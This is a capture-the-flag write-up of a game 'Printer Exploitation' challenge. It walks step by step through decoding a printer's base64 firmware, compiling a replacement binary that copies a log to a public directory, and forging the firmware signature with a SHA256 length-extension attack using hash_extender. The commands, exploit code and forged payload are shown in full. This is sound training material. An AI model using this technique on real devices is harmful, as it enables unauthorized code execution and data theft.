(ch7)=
Printer Exploitation
===

To complete this challenge we have to read the contents of /var/spool/printer.log

```{tip}
To complete this particular challenge a Linux computer is very useful.
```

First of all, let's explore the website of this challenge, https://printer.kringlecastle.com <br>
There are four tabs on the left. The **Firmware Update** one is pretty interesting

## Firmware: Download & Understand it!

In Firmware Update tab click on [**Download current firmware**](https://printer.kringlecastle.com/firmware/download). <br>
The file we download is called `firmware-export.json`. Let's open it.

```Json
{"firmware":"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","signature":"2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97","secret_length":16,"algorithm":"SHA256"}
```
There are 4 fields:
1. **firmware:** this a a very long string probably base64-encoded. Strange, we were expecting a file, but a string can't be a file. **Or can it?!**  We'll see that in a moment.
2. **signature:** this is the hash of the firmware. A security measure.
3. **secret lenght:** the lenght of the secret used to hash. We'll need this later
4. **algorithm:** well...now we know that the hash is a **SHA256**. We'll also need this later

## Firmware: Decode it!

There are two ways to decode the string, [Linux Commands](ch7_linuxcommands) and [CyberChef](ch7_cyberchef)

(ch7_linuxcommands)=
### Linux Commands

First of all, copy the **base64-encoded string** (firmware) and put in into a file. You can use `nano`, `vi` or whatever you want. Let's call this file `original_firmware.b64`. <br>

Now we can use `base64 -d` to decode this file, and redirect the output in another file.

```Shell
$ base64 -d original_firmware.b64 > original_firmware
```
Now, if we try to print the contents of the decoded file with `cat` we see some strange characters, which means that this is a binary file, and cannot be printed. <br>
We can try to use `file` to see the file type

```Shell
$ file original_firmware

original_firmware: Zip archive data, at least v2.0 to extract
```

Oh, looks like the file is a zipfile! Let's unzip it.

```Shell
$ unzip original_firmware

Archive:  original_firmware
  inflating: firmware.bin

$ file firmware.bin

firmware.bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fc77960dcdd5219c01440f1043b35a0ef0cce3e2, not stripped
```

Now we have the actual *firmware executable*. Since it is compiled, we can't just read it, or decompile it, but we may be able to *replace* it!


(ch7_cyberchef)=
### CyberChef

Vis
First of all, visit the [CyberChef Website](https://gchq.github.io/CyberChef/). <br>

* Copy the **base64-encoded string** (firmware) and put it in the **Input** textbox.
* Drag "**From Base64**" into the recipe list.

Ok, we have decoded the base64 string now, but what is this *strange* thing?? <br>
We can try to use the **Magic** (that's the actual name!) operation to know more about this text.

* Drag "**Magic**" into the recipe list.

In the output we can see that the **Magic** function suggests to **Unzip** it. Click on unzip. <br>
<br>
Yes! We found the actual *firmware executable*. As I said during the Linux method, since it is compiled, we can't just read it, or decompile it, but we may be able to *replace* it!

## Firmare: Edit it!

Now we need a way to retrive the file (`/var/spool/printer.log`) we need to complete this challenge. We could do that by uploading a custom firmware that copies that file into `/app/lib/public/incoming` path, which is accessible from outside. Let's do it! <br>
<br>
We wrote a program in C, but you could do the same thing with a simple bash script as well. <br>

This is the code

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
   char ch;
   char source_file[30]="/var/spool/printer.log";
   //usjhsyehdgsttey53 is a random string which we used as the copied file name
   char target_file[43]="/app/lib/public/incoming/usjhsyehdgsttey53";
   FILE *source, *target;


   source = fopen(source_file, "r");

   if( source == NULL )
   {
      exit(EXIT_FAILURE);
   }

   target = fopen(target_file, "w");

   if( target == NULL )
   {
      fclose(source);
      exit(EXIT_FAILURE);
   }

   while( ( ch = fgetc(source) ) != EOF )
      fputc(ch, target);


   fclose(source);
   fclose(target);
   return 0;
}

```

Now build this code using `gcc`

```
gcc firmware.c -o firmware.bin
````
 
```{caution}
This command outputs our new firmware as `firmware.bin`, we can't change that since the server requires that as the file name, so **be careful not to mix <ins>YOUR firmware.bin with the original firmware.bin!</ins>**
```

Now that we have the modified firmware, let's zip it so it's the same as the original one.

```
zip copy.zip firmware.bin
````
```{note}
The new zip-file name can be whatever you want. We called it **copy.zip**
```

We are almost ready to upload it. First, we have to hijack the signature

## Firmware: Hijack it!

Before hijacking the signature, we need the tools to do it. We used [Hash Extender by Ron Bowes](https://github.com/iagox86/hash_extender). Let's clone and build it!

```Bash
$ git clone https://github.com/iagox86/hash_extender.git
$ cd hash_extender
$ make
```
We now have an executable called `hash_extender`. To work in a more ordered environment, you should copy it into the same directory of the two zipfiles.

Now that **hash_extender** is ready to work, we can start the hijacking process. This is what you will need.
1. hash_extender script
2. Original zipfile
3. Edited zipfile
4. Original `firmware-export.json` file

Hash Extender can be used to append a new string (or file!) to the original one. It is able to process the original signature, and to generate a new one, which is still valid, even with our modified file appended! <br>
We are very lucky, because the troll said that the printer only processes the last file inserted if more files in the same format are provided. It's perfect for our append!

Run `hash_extender` with these parameters
* **--file firmware.zip** | This is the original firmware.zip
* **-s 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97** | The signature from the original .json
* **-l 16** | Secret lenght
* **--appendfile copy.zip** | Our modified firmware (zipped!)
* **--out-file output.hex** | The output file (by default it is is hexacedimal. That's perfect for us.)
* **-f sha256** | Hash type

```{admonition} A Little Fun Fact
When we started this challenge in the morning, the `--appendfile` argument didn't exist! You could only append strings. We had to convert to hex, print and run the command for every attempt. In the evening, while we were trying to add our personal `--append-file` argument, we checked the git of the tool again, and the `--appendfile` argument was already there! Someone updated the code a few hours after we originally downloaded it :) <br>
Now, back to the challenge!
```

Let's do this.

```Shell
$ ./hash_extender --file firmware.zip -s 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 -l 16 --appendfile copy.zip --out-file output.hex -f sha256

Type: sha256
Secret length: 16
New signature: 9ae9d5b9301b8f544418627e197c28dd771605c187cc6a213bb1451f8f4b43f1
New string:
```
Save the signature. The new string is in `output.hex` <br>
Now we have to convert `output.hex` to a binary file, because it is in reality a zipfile.

```
$ xxd -r -p output.hex output.zip
```

We're almost done. The last step is to convert this zip file to a **base64-encoded** string.

```
base64 output.zip | tr -d '\n' > newdata.zip.b64
```

```{tip}
Since `base64` outputs the file with line endings to make the file more human-readable, but we have to get a single line, so `tr -d '\n'` was used to remove line endings and got the single line we needed.
```
Now `newdata.zip.b64` contains the base64 encoded firmware. Open it and copy it's content. <br>

## Firmware: Update&Upload it!

Open a copy of `firmware-export.json` and update it with our new strings.
* **signature** --> the one you saved after executing `hash_extender`
* **firmware** --> content of `newdata.zip.b64`

And this is the new .json

```Json
{"firmware":"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","signature":"9ae9d5b9301b8f544418627e197c28dd771605c187cc6a213bb1451f8f4b43f1","secret_length":16,"algorithm":"SHA256"}
```

Now head to https://printer.kringlecastle.com/incoming/usjhsyehdgsttey53 (or whatever file name you inserted!). <br>
Download the file and open it.
```
Documents queued for printing
=============================

Biggering.pdf
Size Chart from https://clothing.north.pole/shop/items/TheBigMansCoat.pdf
LowEarthOrbitFreqUsage.txt
Best Winter Songs Ever List.doc
Win People and Influence Friends.pdf
Q4 Game Floor Earnings.xlsx
Fwd: Fwd: [EXTERNAL] Re: Fwd: [EXTERNAL] LOLLLL!!!.eml
Troll_Pay_Chart.xlsx
```

The filename we were searching for is `Troll_Pay_Chart.xlsx` <br>
This challenge is done. Thank you for reading.
